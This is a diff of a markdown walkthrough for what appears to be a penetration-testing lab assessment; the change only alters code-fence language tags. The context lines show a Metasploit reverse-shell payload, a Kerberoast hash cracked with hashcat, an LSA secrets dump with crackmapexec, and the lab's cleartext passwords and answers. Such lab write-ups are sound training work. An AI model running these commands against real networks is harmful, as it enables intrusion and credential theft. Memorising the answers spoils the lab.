@@ -12,7 +12,7 @@ A team member started an External Penetration Test and was moved to another urge
         ```
 2. Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer. **Answer: svc_sql**
    - Establish a meterpreter session using Metasploit:
-        ```sh
+        ```shellsession
         [msf](Jobs:0 Agents:0) >> use exploit/multi/script/web_delivery
         [msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set payload windows/x64/meterpreter/reverse_tcp
         payload => windows/x64/meterpreter/reverse_tcp
@@ -34,7 +34,7 @@ A team member started an External Penetration Test and was moved to another urge
         [*] Meterpreter session 1 opened (10.10.15.162:4444 -> 10.129.202.242:55132) at 2026-04-18 23:05:20 -0500
         ```
    - Migrate to a stable process:
-        ```sh
+        ```shellsession
         [msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) >> sessions
 
         Active sessions
@@ -191,7 +191,7 @@ A team member started an External Penetration Test and was moved to another urge
                             2423FA7AC0D59993537AAAFF60F0EA405A5FF305F2CB177AF4557BAB15F11845066
         ```
    - Crack the hash with hashcat:
-        ```sh
+        ```shellsession
         $ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt 
         <SNIP>
 
@@ -279,7 +279,7 @@ A team member started an External Penetration Test and was moved to another urge
         10.129.202.242  8888        172.16.6.50     445
         ```
    - From attack host, use crackmapexec to dump LSA secrets exposing `tpetty` to have cleartext credentials stored:
-        ```sh
+        ```shellsession
         $ crackmapexec smb 10.129.202.242 --port 8888 -u svc_sql -p lucky7 --lsa
         SMB         10.129.202.242  8888   MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
         SMB         10.129.202.242  8888   MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
@@ -300,7 +300,7 @@ A team member started an External Penetration Test and was moved to another urge
         ```
 6. Submit this user's cleartext password. **Answer: Sup3rS3cur3D0m@inU2eR**
    - Read in the above tool output:
-        ```sh
+        ```shellsession
         SMB         10.129.202.242  8888   MS01             INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
         ```
 7. What attack can this user perform? **Answer: DCSync**
